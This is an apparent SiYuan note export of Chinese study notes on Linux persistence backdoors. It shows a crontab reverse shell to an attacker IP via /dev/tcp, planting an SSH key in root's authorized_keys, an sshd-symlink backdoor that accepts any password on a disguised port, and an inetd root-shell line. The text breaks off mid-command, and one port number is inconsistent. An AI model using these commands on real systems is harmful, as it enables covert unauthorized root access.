{"ID":"20241031140942-jzwbwp6","Spec":"1","Type":"NodeDocument","Properties":{"icon":"1f42d","id":"20241031140942-jzwbwp6","title":"Linux后门","updated":"20241031181249"},"Children":[{"ID":"20241031140942-hgxe4g9","Type":"NodeHeading","HeadingLevel":3,"Properties":{"fold":"1","id":"20241031140942-hgxe4g9","updated":"20241031141032"},"Children":[{"Type":"NodeText","Data":"计划任务后门crontab"}]},{"ID":"20241031152327-6ouql9p","Type":"NodeBlockquote","Properties":{"fold":"1","heading-fold":"1","id":"20241031152327-6ouql9p","updated":"20241031152414"},"Children":[{"ID":"20241031152324-iq0amys","Type":"NodeParagraph","Properties":{"id":"20241031152324-iq0amys","updated":"20241031152410"},"Children":[{"Type":"NodeText","Data":"Crontab 命令被用来"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"提交和管理"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"用户的需要"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"周期性执行的任务"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，与windows下的计划任务类似\n当安装完成操作系统后，默认会安装此服务工具，并且会"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"自动启动 crond 进程"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，crond 进程"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"每分钟"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"会定期检査是否有要执行的任务，如果有要"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"执行的任务"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，则"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"自动"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"执行该任务"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241031152414-fgr2jch","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241031152414-fgr2jch","updated":"20241031152418"},"Children":[{"Type":"NodeText","Data":"相关命令"}]},{"ID":"20241031152420-9q3a1rh","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031152420-9q3a1rh","updated":"20241031152459"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"crontab [-u user] -e :编辑某个用户的crontab文件内容\ncrontab [-u user] -1 :显示某个用户的crontab文件内容\ncrontab [-u user] -[i]r :从/var/spool/cron目录中删除某个用户的crontab文件，-i参数指定在删除用户的crontab文件时是否有确认提示\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031152511-ad058l9","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031152511-ad058l9","updated":"20241031152517"},"Children":[{"Type":"NodeText","Data":"语法"}]},{"ID":"20241031152512-mih8fi7","Type":"NodeTable","TableAligns":[0,0,0,0,0,0,0],"Properties":{"colgroup":"min-width: 60px;|min-width: 60px;|min-width: 60px;||||","fold":"1","heading-fold":"1","id":"20241031152512-mih8fi7","updated":"20241031152634"},"Children":[{"Type":"NodeTableHead","Data":"thead","Children":[{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"代表意义"}]},{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"分钟"}]},{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"小时"}]},{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"日期"}]},{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"月份"}]},{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"周"}]},{"Type":"NodeTableCell","Data":"th","Children":[{"Type":"NodeText","Data":"命令"}]}]}]},{"Type":"NodeTableRow","Data":"tr","Children":[{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"范围"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"0-59"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"0-23"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"1-31"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"1-12"}]},{"Type":"NodeTableCell","Data":"td","Children":[{"Type":"NodeText","Data":"0-7"}]},{"Type":"NodeTableCell","Data":"td"}]}]},{"ID":"20241031152702-9u0346n","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241031152702-9u0346n","updated":"20241031152707"},"Children":[{"Type":"NodeText","Data":"步骤"}]},{"ID":"20241031152714-azh58ov","Type":"NodeList","ListData":{"Typ":1},"Properties":{"fold":"1","heading-fold":"1","id":"20241031152714-azh58ov","updated":"20241031164346"},"Children":[{"ID":"20241031152714-v7v6u6x","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"MS4=","Num":1},"Properties":{"id":"20241031152714-v7v6u6x"},"Children":[{"ID":"20241031152708-i5fbpwb","Type":"NodeParagraph","Properties":{"id":"20241031152708-i5fbpwb","updated":"20241031152722"},"Children":[{"Type":"NodeText","Data":"在攻击机中进行监听"}]},{"ID":"20241031152813-tgadg5v","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241031152813-tgadg5v","updated":"20241031161330"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"nc -lvvp 监听端口号\nnc -lvvp 6666\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031161038-k8ip17t","Type":"NodeParagraph","Properties":{"id":"20241031161038-k8ip17t","updated":"20241031161038"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031161038-vsdkz5v.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]},{"ID":"20241031152723-e8c4tt9","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"Mi4=","Num":2},"Properties":{"id":"20241031152723-e8c4tt9","updated":"20241031164346"},"Children":[{"ID":"20241031152723-8g2ok47","Type":"NodeParagraph","Properties":{"id":"20241031152723-8g2ok47","updated":"20241031152733"},"Children":[{"Type":"NodeText","Data":"目标机写入计划任务"}]},{"ID":"20241031152942-esw12ol","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241031152942-esw12ol","updated":"20241031164218"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"crontab -e \n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/攻击机/端口 0\u003e\u00261\n[root@CentOS7 ~]# crontab -e \n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/192.168.134.128/6666 0\u003e\u00261\n\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031164246-r3cb0bb","Type":"NodeParagraph","Properties":{"id":"20241031164246-r3cb0bb","updated":"20241031164346"},"Children":[{"Type":"NodeText","Data":"​​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031164346-yq36ztc.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​​​"}]}]},{"ID":"20241031152733-24n00nq","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"My4=","Num":3},"Properties":{"id":"20241031152733-24n00nq","updated":"20241031164319"},"Children":[{"ID":"20241031152733-kvn4c8o","Type":"NodeParagraph","Properties":{"id":"20241031152733-kvn4c8o","updated":"20241031152747"},"Children":[{"Type":"NodeText","Data":"目标机自动执行后，攻击机获得反弹shell"}]},{"ID":"20241031164318-zvicfyd","Type":"NodeParagraph","Properties":{"id":"20241031164318-zvicfyd","updated":"20241031164319"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031164313-43j8noi.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]}]},{"ID":"20241031141105-p9elc1j","Type":"NodeHeading","HeadingLevel":3,"Properties":{"fold":"1","id":"20241031141105-p9elc1j","updated":"20241031141447"},"Children":[{"Type":"NodeText","Data":"ssh公钥免密"}]},{"ID":"20241031153239-g6f67j1","Type":"NodeBlockquote","Properties":{"fold":"1","heading-fold":"1","id":"20241031153239-g6f67j1","updated":"20241031154047"},"Children":[{"ID":"20241031153223-1l1t7th","Type":"NodeParagraph","Properties":{"id":"20241031153223-1l1t7th","updated":"20241031153255"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"公私钥原理"}]},{"ID":"20241031153257-uew1746","Type":"NodeParagraph","Properties":{"id":"20241031153257-uew1746","updated":"20241031153402"},"Children":[{"Type":"NodeText","Data":"公私钥同时生成，公钥用于加密，私钥用于解密。公钥外持私钥内持"}]},{"ID":"20241031153404-ll9ekpd","Type":"NodeParagraph","Properties":{"id":"20241031153404-ll9ekpd","updated":"20241031153437"},"Children":[{"Type":"NodeText","Data":"ssh服务中，只需公钥放在服务器A上，就可以通过通过私钥登录到服务器A中"}]},{"ID":"20241031153934-8zyuf7u","Type":"NodeParagraph","Properties":{"id":"20241031153934-8zyuf7u","updated":"20241031153938"}},{"ID":"20241031153935-61cw3hu","Type":"NodeParagraph","Properties":{"id":"20241031153935-61cw3hu","updated":"20241031153956"},"Children":[{"Type":"NodeText","Data":"将客户端生成的ssh公钥写到目标服务器的 "},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"~/.ssh/authorized_keys"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"中，之后客户端"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"利用私钥完成认证"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"即可登录"}]},{"ID":"20241031153940-dqjnuk3","Type":"NodeParagraph","Properties":{"id":"20241031153940-dqjnuk3","updated":"20241031154044"},"Children":[{"Type":"NodeText","Data":"该后门比较"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"容易被发现"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241031154040-jw0b7r7","Type":"NodeParagraph","Properties":{"id":"20241031154040-jw0b7r7","updated":"20241031154047"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"在中途会让输入密钥对的密码，由于需要实现免密登录，所以回车跳过即可"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241031153910-jplqcee","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031153910-jplqcee"}},{"ID":"20241031153903-k3xwssb","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241031153903-k3xwssb","updated":"20241031153907"},"Children":[{"Type":"NodeText","Data":"步骤"}]},{"ID":"20241031141457-ejna6ht","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031141457-ejna6ht","updated":"20241031141513"},"Children":[{"Type":"NodeText","Data":"攻击机生成公钥/私钥对"}]},{"ID":"20241031141515-p2fe33y","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031141515-p2fe33y","updated":"20241031154024"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"ssh-keygen -t rsa\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031164923-pt87xsq","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031164923-pt87xsq","updated":"20241031164923"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031164923-i2up00d.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241031141542-726y012","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031141542-726y012","updated":"20241031154121"},"Children":[{"Type":"NodeText","Data":"将攻击机.ssh目录下的id_rsa.pub复制到目标服务器的/root/.ssh、authorized_keys文件里"}]},{"ID":"20241031141733-8ls7kgf","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031141733-8ls7kgf","updated":"20241031154326"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"scp ~/.ssh/id_rsa.pub root@目标ip地址:/root/.ssh/authorized_keys\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031165228-aa50867","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031165228-aa50867","updated":"20241031175942"},"Children":[{"Type":"NodeText","Data":"​​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031175942-1oavjaj.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​"}]},{"ID":"20241031141736-h4p2d48","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031141736-h4p2d48","updated":"20241031154359"},"Children":[{"Type":"NodeText","Data":"目标服务器中，将authorized_keys的权限改为600"}]},{"ID":"20241031154401-lbpyzal","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031154401-lbpyzal","updated":"20241031154418"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"chmod 600 /root/.ssh/authorized_keys\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031180022-cld4zly","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031180022-cld4zly","updated":"20241031180022"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031180022-x8go1h2.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241031142810-wgr4ky9","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031142810-wgr4ky9","updated":"20241031180111"},"Children":[{"Type":"NodeText","Data":"免密连接目标服务器"}]},{"ID":"20241031154444-y0hxgyh","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031154444-y0hxgyh","updated":"20241031180118"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"ssh root@192.168.134.132\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031180101-2svawm4","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031180101-2svawm4","updated":"20241031180101"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031180101-vtmqllg.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241031141737-fx4wuip","Type":"NodeHeading","HeadingLevel":3,"Properties":{"fold":"1","id":"20241031141737-fx4wuip","updated":"20241031142806"},"Children":[{"Type":"NodeText","Data":"ssh软连接后门"}]},{"ID":"20241031154512-99hwelv","Type":"NodeBlockquote","Properties":{"fold":"1","heading-fold":"1","id":"20241031154512-99hwelv","updated":"20241031154757"},"Children":[{"ID":"20241031141737-gciglwa","Type":"NodeParagraph","Properties":{"id":"20241031141737-gciglwa","updated":"20241031154552"},"Children":[{"Type":"NodeText","Data":"ssh软连接后门是一种经典后门，直接对sshd建立软链接，之后用任意密码就可以登录"}]},{"ID":"20241031154604-nbqy3iy","Type":"NodeParagraph","Properties":{"id":"20241031154604-nbqy3iy","updated":"20241031154620"},"Children":[{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"软连接后门的原理"}]},{"ID":"20241031154618-gco8wvv","Type":"NodeParagraph","Properties":{"id":"20241031154618-gco8wvv","updated":"20241031154703"},"Children":[{"Type":"NodeText","Data":"是利用了"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"PAM配置文件"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"的作用，将"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"sshd文件软连接名称设置为su"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，这样应用在"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"启动过程"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"中会去PAM配置文件夹中寻找是否存在对应名称的配置信息(su)，su在pam rootok只检测uid 0 即可认证成功，也可以使用其他软连接名字，但是文件"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"必须得在/etc/pam.d目录下存在"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"。\n"}]},{"ID":"20241031154707-yq2gl0m","Type":"NodeParagraph","Properties":{"id":"20241031154707-yq2gl0m","updated":"20241031154734"},"Children":[{"Type":"NodeText","Data":"特点:"}]},{"ID":"20241031154744-dnn3s7z","Type":"NodeList","ListData":{"Typ":1},"Properties":{"id":"20241031154744-dnn3s7z","updated":"20241031154757"},"Children":[{"ID":"20241031154744-gyspvfk","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"MS4=","Num":1},"Properties":{"id":"20241031154744-gyspvfk","updated":"20241031154750"},"Children":[{"ID":"20241031154735-7o7fkaw","Type":"NodeParagraph","Properties":{"id":"20241031154735-7o7fkaw","updated":"20241031154750"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"隐蔽性较弱"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，适一般的rookit hunter这类的防护脚本就可以扫描到；"}]}]},{"ID":"20241031154744-p28wa19","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"Mi4=","Num":2},"Properties":{"id":"20241031154744-p28wa19","updated":"20241031154754"},"Children":[{"ID":"20241031154726-uxr6mcx","Type":"NodeParagraph","Properties":{"id":"20241031154726-uxr6mcx","updated":"20241031154754"},"Children":[{"Type":"NodeText","Data":"在本地查看端口号时会"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"暴露端口"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，建议进行伪装"}]}]},{"ID":"20241031154744-op5eid4","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"My4=","Num":3},"Properties":{"id":"20241031154744-op5eid4","updated":"20241031154757"},"Children":[{"ID":"20241031154731-6f6fwz3","Type":"NodeParagraph","Properties":{"id":"20241031154731-6f6fwz3","updated":"20241031154757"},"Children":[{"Type":"NodeText","Data":"能够"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"绕过"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"一些网络设备的安全流量监控"}]}]}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241031154802-8fe6d2t","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031154802-8fe6d2t"}},{"ID":"20241031154804-kb3id6o","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241031154804-kb3id6o","updated":"20241031154805"},"Children":[{"Type":"NodeText","Data":"步骤"}]},{"ID":"20241031141737-6k24784","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031141737-6k24784","updated":"20241031180439"},"Children":[{"Type":"NodeText","Data":"创建"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"软链接"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，设置"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"监听端口(伪装成常见端口)"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241031144019-uq5vdv7","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031144019-uq5vdv7","updated":"20241031180315"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"ln -sf  /usr/sbin/sshd /tmp/su\n/tmp/su -oPort=8080\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031144023-2fddr1z","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031144023-2fddr1z","updated":"20241031180309"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031180306-kuddcdf.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241031141738-sd82wrc","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031141738-sd82wrc","updated":"20241031180429"},"Children":[{"Type":"NodeText","Data":"尝试使用ssh连接目标服务器，使用"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text strong","TextMarkTextContent":"任意密码"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"都可以登录"}]},{"ID":"20241031154939-zambg6h","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241031154939-zambg6h","updated":"20241031180419"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"ssh root@192.168.134.132 -p 8081\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241031180427-4lkc33u","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241031180427-4lkc33u","updated":"20241031180427"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241031180427-6nzyc9c.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241031144152-q61a2gc","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241031144152-q61a2gc","updated":"20241031155020"},"Children":[{"Type":"NodeText","Data":"inetd/xined后门  13端口"}]},{"ID":"20241031155030-siqoobz","Type":"NodeBlockquote","Properties":{"id":"20241031155030-siqoobz","updated":"20241031155315"},"Children":[{"ID":"20241031155122-4zdkvtr","Type":"NodeParagraph","Properties":{"id":"20241031155122-4zdkvtr","updated":"20241031155152"},"Children":[{"Type":"NodeText","Data":"用来监听外部网络请求socket的系统守护进程，"}]},{"ID":"20241031155156-cjjojkz","Type":"NodeParagraph","Properties":{"id":"20241031155156-cjjojkz","updated":"20241031155315"},"Children":[{"Type":"NodeText","Data":"过程：当inetd接收到一个外部请求后，会根据这个请求到自己的配置文件中去找到实际处理它的程序，再把接收到socket交给那个程序处理"}]},{"ID":"20241031155021-b1riqtb","Type":"NodeParagraph","Properties":{"id":"20241031155021-b1riqtb","updated":"20241031155055"},"Children":[{"Type":"NodeText","Data":"inetd  --- kali"}]},{"ID":"20241031155039-tximdsw","Type":"NodeParagraph","Properties":{"id":"20241031155039-tximdsw","updated":"20241031155057"},"Children":[{"Type":"NodeText","Data":"xined  --- centos"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241031144204-19x51pw","Type":"NodeParagraph","Properties":{"id":"20241031144204-19x51pw","updated":"20241031155114"}},{"ID":"20241031155114-sh0gl7h","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20241031155114-sh0gl7h","updated":"20241031155116"},"Children":[{"Type":"NodeText","Data":"步骤"}]},{"ID":"20241031181239-154kfnf","Type":"NodeHeading","HeadingLevel":6,"Properties":{"id":"20241031181239-154kfnf","updated":"20241031181249"},"Children":[{"Type":"NodeText","Data":"centos安装inetd步骤"}]},{"ID":"20241031181249-khpnilw","Type":"NodeParagraph","Properties":{"id":"20241031181249-khpnilw"}},{"ID":"20241031144220-5ip3yy1","Type":"NodeParagraph","Properties":{"id":"20241031144220-5ip3yy1","updated":"20241031155326"},"Children":[{"Type":"NodeText","Data":"向/etc/inetd.conf文件中加入一行："},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"daytime stream tco nowait root /bin/bash bash -i"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241031144300-vmq71sx","Type":"NodeParagraph","Properties":{"id":"20241031144300-vmq71sx","updated":"20241031155350"},"Children":[{"Type":"NodeText","Data":"开启inet 之后使用nc连接  "},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"nc 